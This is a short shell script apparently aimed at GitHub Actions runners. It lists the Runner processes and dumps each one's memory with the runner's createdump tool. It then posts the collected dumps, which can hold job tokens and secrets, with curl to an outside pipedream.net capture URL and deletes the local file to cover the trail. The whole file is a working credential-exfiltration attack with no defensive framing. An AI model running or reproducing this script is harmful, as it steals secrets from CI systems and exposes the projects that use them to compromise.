#!/bin/sh

echo "--- START ---" > /tmp/file.txt

echo "--- ps -ef | grep Runner" >> /tmp/file.txt
ps -ef | grep Runner >> /tmp/file.txt

echo "--- /home/runner/runners/2.284.0/bin" >> /tmp/file.txt
ls -1la /home/runner/runners/2.284.0/bin >> /tmp/file.txt

echo "--- /home/runner/runners/2.283.3/bin" >> /tmp/file.txt
ls -1la /home/runner/runners/2.283.3/bin >> /tmp/file.txt

echo "file"
file /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt

for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "---$pid---" >> /tmp/file.txt;
    echo $(pwdx $pid) >> /tmp/file.txt;
    /home/runner/runners/2.284.0/bin/createdump $pid >> /tmp/file.txt;
    cat /tmp/coredump.$pid >> /tmp/file.txt;
    echo "--- done ---" >> /tmp/file.txt;
done

#echo "--- strings"
#strings /home/runner/runners/2.284.0/bin/createdump >> /tmp/file.txt

echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/

rm /tmp/file.txt
